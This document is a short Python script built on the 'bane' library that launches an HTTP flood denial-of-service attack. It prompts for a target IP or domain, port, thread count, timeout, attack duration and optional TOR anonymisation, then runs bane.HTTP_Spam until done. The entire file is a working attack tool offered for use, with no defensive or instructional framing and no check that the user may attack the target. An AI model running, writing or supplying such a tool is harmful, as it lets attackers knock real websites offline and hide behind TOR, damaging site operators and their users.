import bane,sys,socket

if sys.version_info < (3, 0):
    input = raw_input

while True:
    try:
        target = input(bane.Fore.GREEN + '\nTarget IP / Domain: ' + bane.Fore.WHITE)
        socket.gethostbyname(target)
        break
    except:
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)

while True:
    try:
        port = int(input(bane.Fore.GREEN + '\nPort ( number between 1 - 65565 ) : ' + bane.Fore.WHITE ))
        if port > 0 and port < 65566 :
            break
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
    except:
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)

while True:
    try:
        threads = int(input(bane.Fore.GREEN + '\nThreads ( number between 1 - 1000 ) : ' + bane.Fore.WHITE))
        if threads > 0 and threads < 1001 :
            break
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
    except:
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)

while True:
    try:
        timeout = int(input(bane.Fore.GREEN + '\nTimeout ( number between 1 - 30 ) : ' + bane.Fore.WHITE))
        if timeout > 0 and timeout < 31 :
            break
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
    except:
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)

while True:
    try:
        duration = int(input(bane.Fore.GREEN + '\nAttack duration in seconds ( number between 1 - 1000000 ) : ' + bane.Fore.WHITE))
        if duration > 0 and duration < 1000000 :
            break
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
    except:
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)

while True:
    try:
        tor = input(bane.Fore.GREEN + '\nIs TOR enabled? ( yes / no ) : ' + bane.Fore.WHITE).lower()
        if tor in ['n','y','yes','no']:
            if tor in ['n','no']:
                tor=False
            elif tor in ['y','yes']:
                tor=True
            break
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
    except:
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)

http_flooder_instance = bane.HTTP_Spam(target,p=port,timeout=timeout,threads=threads, duration=duration, tor=tor, logs=True)

print(bane.Fore.RESET)

while True:
    try:
        if http_flooder_instance.done() == True:
            break
    except:
        break